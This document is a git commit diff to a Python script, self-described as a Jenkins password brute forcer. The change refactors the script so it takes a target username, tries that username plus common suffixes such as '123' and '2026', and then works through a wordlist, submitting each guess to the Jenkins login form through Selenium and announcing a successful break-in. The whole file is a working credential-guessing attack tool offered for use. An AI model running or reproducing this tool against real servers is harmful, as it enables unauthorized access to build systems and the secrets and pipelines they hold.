9fd66c9948eebd45f477b0c18b7bceda64e8e6e7
BlueDragonSecurity <144339177+bluedragonsecurity@users.noreply.github.com>
2026-01-08 13:50:58 +0700

    Add files via upload

--- jenkins.py
+++ jenkins.py
@@ -3,6 +3,7 @@
 jenkins password brute forcer
 code by : wisdom (Antonius)
 https://www.bluedragonsec.com
+https://github.com/bluedragonsecurity
 '''
 import sys,time, os
 from selenium import webdriver
@@ -29,58 +30,81 @@ def init_browser():
     except Exception as e:
         raise e
 
+def validate_user_login(driver, target_url, username, password):
+    url_sekarang = driver.current_url
+    #and "loginError" not in url_sekarang
+    if "Invalid username or password" not in driver.page_source and "loginError" not in url_sekarang:
+        if "security_check" in url_sekarang or "Not Found" in driver.page_source or "security_check" in driver.page_source:
+            driver.get(target_url)
+            wait = WebDriverWait(driver, 5)
+            time.sleep(6)
+        elif "j_username" in driver.page_source and "j_password" in driver.page_source:
+            time.sleep(0.1)
+        else:
+            #print(driver.page_source)
+            print("[+] w00t ! successfully login using username : "+username+"  password : " + password)
+            sys.exit()
+    return driver
 
-if len(sys.argv) < 3:
-    print("[+] usage : ./" + sys.argv[0] + " <target_jenkins_login_url> <wordlist_path>")
+def login(driver,username, password, target_url):
+    print("[+] trying to login using password : " + password)
+    wait = WebDriverWait(driver, 8)
+    time.sleep(8)
+    try:
+        username_field = driver.find_element(By.ID, "j_username")
+    except:
+        try:
+            username_field = wait.until(EC.visibility_of_element_located((By.NAME, "j_username")))
+        except Exception as e:
+            #print(driver.page_source)
+            raise e
+        pass
+    username_field.clear()
+    username_field.send_keys(username)
+    try:
+        password_field = driver.find_element(By.ID, "j_password")
+    except:
+        try:
+            password_field = wait.until(EC.visibility_of_element_located((By.NAME, "j_password")))
+        except Exception as e:
+            raise e
+        pass
+    password_field.clear()
+    password_field.send_keys(password)
+    try:
+        button = wait.until(EC.element_to_be_clickable((By.NAME, "Submit")))
+    except:
+        button = driver.find_element(By.NAME, "Submit")
+    button.click()
+    time.sleep(6)
+    driver = validate_user_login(driver, target_url, username, password)
+    return driver
+
+
+varian_sandi = ["123", "12345", "2025", "2026", "@123", "@*123", "#123"]
+if len(sys.argv) < 4:
+    print("[+] usage : " + sys.argv[0] + " <target_jenkins_login_url> <wordlist_path> <username>")
     sys.exit()
 else:
     wordlist = sys.argv[2]
     target_url = sys.argv[1]
+    username = sys.argv[3]
     if "http" not in target_url:
         target_url = "https://" + target_url
     if "/login" not in target_url:
         target_url += "/login" 
     print("[+] bruteforcing " +  target_url)
     print("[+] wordlist : " + wordlist)
+    print("[+] username : " + username)
     driver = init_browser()
     driver.get(target_url)
-    wait = WebDriverWait(driver, 8)
-    time.sleep(4)
+    driver = login(driver,username, username, target_url)
+    for sandi in varian_sandi:
+        password = username + sandi
+        driver = login(driver,username, password, target_url)
     with open(wordlist, 'r') as file:
         for line in file:
             password = line.strip()
-            print("[+] trying to login using password : " + password)
-            try:
-                username_field = wait.until(EC.visibility_of_element_located((By.NAME, "j_username")))
-            except:
-                try:
-                    username_field = driver.find_element(By.ID, "j_username")
-                except Exception as e:
-                    #print(driver.page_source)
-                    raise e
-            username_field.clear()
-            username_field.send_keys("admin")
-            try:
-                password_field = wait.until(EC.visibility_of_element_located((By.NAME, "j_password")))
-            except:
-                password_field = driver.find_element(By.ID, "j_password")
-            password_field.clear()
-            password_field.send_keys(password)
-            time.sleep(1)
-            try:
-                button = wait.until(EC.element_to_be_clickable((By.NAME, "Submit")))
-            except:
-                button = driver.find_element(By.NAME, "Submit")
-            button.click()
-            time.sleep(4)
-            url_sekarang = driver.current_url
-           
-            if "Invalid username or password" not in driver.page_source and "loginError" not in url_sekarang:
-                if "j_spring_security_check" in url_sekarang or "Not Found" in driver.page_source:
-                    driver.get(target_url)
-                    wait = WebDriverWait(driver, 8)
-                    time.sleep(4)
-                else:
-                    print("[+] w00t ! successfully login using admin and password : " + password)
-                    sys.exit()
+            driver = login(driver,username, password, target_url)
+            
             
